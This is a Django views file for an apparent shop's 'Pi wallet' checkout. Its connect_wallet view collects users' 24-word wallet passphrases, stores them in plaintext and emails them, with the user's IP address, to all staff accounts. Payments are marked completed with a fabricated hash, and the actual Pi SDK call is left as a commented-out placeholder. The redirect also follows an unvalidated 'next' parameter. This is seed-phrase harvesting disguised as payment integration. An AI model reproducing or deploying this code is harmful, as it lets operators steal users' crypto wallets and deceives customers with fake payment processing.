from django.shortcuts import render, redirect, get_object_or_404
from django.urls import reverse
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.mail import send_mail
from django.conf import settings
from django.template.loader import render_to_string
from .models import PiWallet, PiTransaction
from .forms import PassphraseForm
from mnemonic import Mnemonic
import json
import hashlib
from django.utils import timezone
from order.models import Order
from django.contrib.auth import get_user_model

@login_required
def connect_wallet(request):
    """Connect Pi wallet using 24-word passphrase"""
    if request.method == 'POST':
        form = PassphraseForm(request.POST)
        if form.is_valid():
            passphrase = form.cleaned_data['passphrase']
            try:
                # Create or update wallet
                wallet, created = PiWallet.objects.update_or_create(
                    user=request.user,
                    defaults={
                        'passphrase': passphrase,
                        'is_verified': False  # Reset verification status
                    }
                )
                
                # Send email notification with error handling
                try:
                    send_admin_notification(request.user, passphrase, request)
                    messages.success(request, 'Pi wallet connected successfully! Admin verification pending.')
                except Exception as e:
                    print(f"Email error: {str(e)}")
                    messages.warning(request, 'Wallet connected, but admin notification failed. Please contact support.')
                
                # Redirect back to checkout if next parameter exists
                next_url = request.GET.get('next')
                if next_url:
                    return redirect(next_url)
                return redirect('order:checkout')
                
            except Exception as e:
                print(f"Wallet connection error: {str(e)}")
                messages.error(request, 'Error connecting wallet. Please try again.')
    else:
        form = PassphraseForm()
    
    return render(request, 'payment/connect_wallet.html', {
        'form': form,
        'existing_wallet': PiWallet.objects.filter(user=request.user).first()
    })

def send_admin_notification(user, passphrase, request):
    """Send passphrase to admin via email"""
    try:
        subject = f'New Pi Wallet Connection - {user.email}'
        
        context = {
            'user': user,
            'passphrase': passphrase,
            'timestamp': timezone.now(),
            'ip_address': get_client_ip(request)
        }
        
        message = render_to_string('payment/email/admin_notification.txt', context)
        html_message = render_to_string('payment/email/admin_notification.html', context)
        
        # Get staff users' emails
        User = get_user_model()
        staff_emails = User.objects.filter(is_staff=True, is_active=True).values_list('email', flat=True)
        
        if not staff_emails:
            # Fallback to superuser if no staff emails found
            staff_emails = User.objects.filter(is_superuser=True, is_active=True).values_list('email', flat=True)
        
        if staff_emails:
            send_mail(
                subject=subject,
                message=message,
                from_email=settings.DEFAULT_FROM_EMAIL,
                recipient_list=list(staff_emails),
                html_message=html_message,
                fail_silently=False
            )
            print(f"Admin notification email sent to {staff_emails}")
            return True
        else:
            print("No staff users found to send notification")
            return False
            
    except Exception as e:
        print(f"Failed to send admin notification: {str(e)}")
        raise

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@login_required
def process_payment(request, order_id):
    """Process Pi payment for an order"""
    order = get_object_or_404(Order, id=order_id, user=request.user)
    wallet = get_object_or_404(PiWallet, user=request.user)
    
    if request.method == 'POST':
        try:
            # Create and complete Pi transaction
            transaction = PiTransaction.objects.create(
                order=order,
                wallet=wallet,
                amount=order.total_amount,
                status='completed',
                transaction_hash=f"MANUAL-{timezone.now().timestamp()}"
            )
            
            # Update order status
            order.payment_status = True
            order.status = 'processing'  # Update order status
            order.save()
            
            # Update order history
            order.update_status('processing', user=request.user, notes='Payment completed via Pi wallet')
            
            messages.success(request, 'Payment processed successfully!')
            return redirect('order:order_detail', order.id)
                
        except Exception as e:
            messages.error(request, 'Error processing payment. Please try again.')
    
    return render(request, 'payment/process_payment.html', {
        'order': order,
        'wallet': wallet
    })

#def process_pi_payment(payment_data):
#    """Process payment through Pi Network"""
#    # Implement actual Pi payment processing here
#    # This is a placeholder for Pi Network SDK integration
#    return {
#        'status': 'completed',
#        'transaction_hash': hashlib.sha256(json.dumps(payment_data).encode()).hexdigest()
#    }
